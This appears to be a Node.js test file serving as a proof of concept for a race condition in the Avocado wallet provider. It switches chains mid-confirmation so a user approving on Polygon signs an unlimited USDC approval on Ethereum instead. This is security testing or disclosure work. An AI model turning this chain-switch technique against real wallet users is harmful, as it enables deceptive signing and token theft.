const { test } = require('node:test');
const assert = require('node:assert/strict');
const { JSDOM } = require('jsdom');
const { ethers } = require('ethers');

const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', { url: 'http://localhost' });
global.window = dom.window;
global.document = dom.window.document;
global.HTMLElement = dom.window.HTMLElement;
global.customElements = dom.window.customElements;
global.self = dom.window;
customElements.define('avocado-safe-element', class extends HTMLElement {});
document.body.innerHTML = '<avocado-safe-element></avocado-safe-element>';

const wallet = ethers.Wallet.createRandom();
let bridgeChainId, signedSalt, broadcastTargetChainId;

const SAFE_ADDR = '0x' + 'ab'.repeat(20);
const rpcResponses = {
    eth_chainId: (cid) => ethers.utils.hexValue(cid),
    eth_call: (params) => {
        const sig = params[0].data.slice(0, 10);
        if (sig === '0x4e1d91d8') return ethers.utils.defaultAbiCoder.encode(['address'], [SAFE_ADDR]);
        if (sig === '0x8186a7c4' || sig === '0xb4907ddc') return ethers.utils.defaultAbiCoder.encode(['string'], ['2.0.1']);
        if (sig === '0x87265c95') return ethers.utils.defaultAbiCoder.encode(['string'], ['Avocado']);
        if (sig === '0x8b09021f') return ethers.utils.defaultAbiCoder.encode(['string'], ['2.0.1']);
        return ethers.utils.defaultAbiCoder.encode(['uint256'], [0]);
    }
};

window.ethereum = {
    isMetaMask: true,
    request: async ({ method, params }) => {
        if (method === 'eth_requestAccounts' || method === 'eth_accounts') return [wallet.address];
        if (method === 'eth_chainId') return '0x27a';
        if (method === 'net_version') return '634';
        if (method === 'wallet_switchEthereumChain' || method === 'wallet_addEthereumChain') return null;
        if (method === 'eth_signTypedData_v4') {
            // capture the EIP-712 domain salt to prove which chain was actually signed for
            const payload = JSON.parse(params[1]);
            signedSalt = payload.domain.salt;
            const types = { ...payload.types };
            delete types.EIP712Domain;
            return wallet._signTypedData(payload.domain, types, payload.message);
        }
        return null;
    },
    on: () => {},
    removeListener: () => {},
};

const { AvocadoSafeProvider, bridge, getRpcProvider, RPC_URLS } = require('@instadapp/avocado');

for (const chainId of [1, 137, 634, ...Object.keys(RPC_URLS).map(Number)]) {
    const provider = getRpcProvider(chainId);
    provider.send = async (method, params) => {
        if (method === 'txn_broadcast') {
            broadcastTargetChainId = params[0].targetChainId;
            return '0x';
        }
        if (method === 'eth_chainId') return rpcResponses.eth_chainId(chainId);
        if (method === 'eth_call') return rpcResponses.eth_call(params);
        return '0x0';
    };
    provider.detectNetwork = async () => ({ chainId, name: 'mock' });
    provider.getNetwork = async () => ({ chainId, name: 'mock' });
}

test('chain switch during bridge confirmation redirects transaction', { timeout: 15000 }, async () => {
    const provider = new AvocadoSafeProvider({ chainId: 137 });

    bridge.bus.on('request:sendTransaction', (data) => {
        bridgeChainId = data.chainId;
        // attack: switch target chain while confirmation modal is displayed
        provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
        // resolve bridge after handler registration completes
        setTimeout(() => bridge.response('sendTransaction', {}), 0);
    });

    try {
        await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                to: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                data: '0x095ea7b3000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef' +
                      'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
                value: '0x0',
            }],
        });
    } catch (e) { }

    // keccak256(abi.encode(uint256(chainId))) is the domain salt the contract verifies against
    const ethSalt = ethers.utils.solidityKeccak256(['uint256'], [1]);
    const polySalt = ethers.utils.solidityKeccak256(['uint256'], [137]);

    assert.strictEqual(bridgeChainId, 137, 'bridge modal displayed Polygon (137)');
    assert.strictEqual(signedSalt, ethSalt, 'signature salt matches Ethereum (1)');
    assert.notStrictEqual(signedSalt, polySalt, 'signature salt does NOT match Polygon (137)');
    assert.strictEqual(broadcastTargetChainId, '1', 'broadcast targets Ethereum (1)');
});
